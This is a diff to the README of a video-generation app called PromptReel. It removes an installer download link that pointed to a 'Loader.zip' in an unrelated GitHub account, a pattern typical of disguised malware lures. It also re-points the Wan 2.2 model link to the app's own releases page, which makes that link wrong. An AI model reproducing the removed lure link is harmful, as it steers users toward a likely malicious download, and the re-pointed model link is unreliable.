@@ -57,7 +57,7 @@ The finished clip is saved with its prompt, ready to export or run again with a 
 
 ## Download
 
-1. Download **PromptReel-desktop-win-x64.exe** from the [latest release](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip).
+1. Download **PromptReel-desktop-win-x64.exe** from the [latest release](../../releases).
 2. Run it. No unzipping, and no admin rights: the installer puts one file in `%LOCALAPPDATA%\Programs\PromptReel` and adds a Start menu shortcut. You can pick another folder with **Change**.
 3. Open PromptReel from the Start menu. On the first launch you need internet, to download the video model. After that it works offline.
 
@@ -71,7 +71,7 @@ Windows 10 or 11, 64-bit. macOS is in development.
 
 **Is it really free?** Yes. It is in beta, so some things will change.
 
-**Which model does it use?** [Wan 2.2](https://github.com/Wan-Video/Wan2.2), an open-source video model under the Apache 2.0 license.
+**Which model does it use?** [Wan 2.2](../../releases), an open-source video model under the Apache 2.0 license.
 
 **Can I use the clips commercially?** The model license allows it. Read the final terms in the app before you publish client work.
 
